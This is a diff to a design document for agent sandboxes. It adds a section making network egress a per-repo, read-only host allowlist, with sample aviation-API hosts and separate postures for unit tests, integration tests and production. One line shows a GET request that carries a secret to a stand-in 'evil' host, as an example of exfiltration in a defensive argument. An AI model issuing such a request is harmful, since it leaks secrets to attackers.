@@ -72,7 +72,48 @@ not build/dep manifests):
 - `system_libs` — `-dev` packages implied by native deps (e.g. `libssl-dev`,
   `libpq-dev`, `libvips-dev`).
 - `egress_hosts` — registries from lockfile resolution URLs + `.npmrc`, plus
-  `nodejs.org` when `native_build`.
+  `nodejs.org` when `native_build`, **plus the repo's declared runtime/integration
+  API hosts** (see §2a).
+
+### 2a. Egress is a declared, read-only-scoped contract dimension — not a wall
+
+Deny-by-default egress is the correct *default* for an unknown repo running a
+`--yolo` agent, but it must not be a fixed wall: a real application legitimately
+reads from external APIs, and the allowlist is part of the repo's environment
+contract exactly as package registries are. A repo declares the hosts it reads,
+scoped and audited:
+
+```
+egress:
+  - host: opensky-network.org   access: read-only   # ADS-B state vectors
+  - host: aviationweather.gov   access: read-only   # SIGMET/AIRMET
+  - host: tfr.faa.gov           access: read-only   # TFRs
+```
+
+Principles:
+
+- **Host-allowlisting is the axis, not GET-vs-POST.** `GET https://evil/?x=<secret>`
+  is exfiltration with a GET; a `GET` is only safe if the *host* is trusted. The
+  policy keys on host + method + `read-only`, so a repo can be granted read-only
+  GET to exactly its declared hosts and nothing else.
+- **Derived/declared per-repo, not global.** The hosts come from the repo's
+  contract (and, where inferable, its source — API base URLs / SDK clients), and
+  are rendered into that repo's sandbox policy. The unknown repo still gets deny-
+  all; the known repo gets exactly what it declares.
+- **Three postures for three activities** (do not conflate them):
+  1. *Agent writes code + unit tests* → deny-by-default; unit tests are
+     **hermetic** (mock external HTTP, drive from committed fixtures). This is good
+     engineering everywhere, not a sandbox crutch — CI must not flake on a third-
+     party API's rate limit or downtime.
+  2. *Integration test against a live API* → an **opt-in tier** that runs with the
+     repo's declared read-only egress; never the default gate.
+  3. *The app fetching live data in production* → runs **outside** the sandbox in
+     its real deployment with its own network policy. The sandbox is a build/test/
+     agent-dev environment, not the production runtime.
+
+A repo whose legitimate external dependencies are blocked by the same wall as a
+malicious exfiltration attempt is a *mis-declared* contract, not a sandbox
+limitation — the fix is to declare the egress, read-only, per repo.
 
 ### 3. Provisioning router — cheapest layer that satisfies each requirement
 
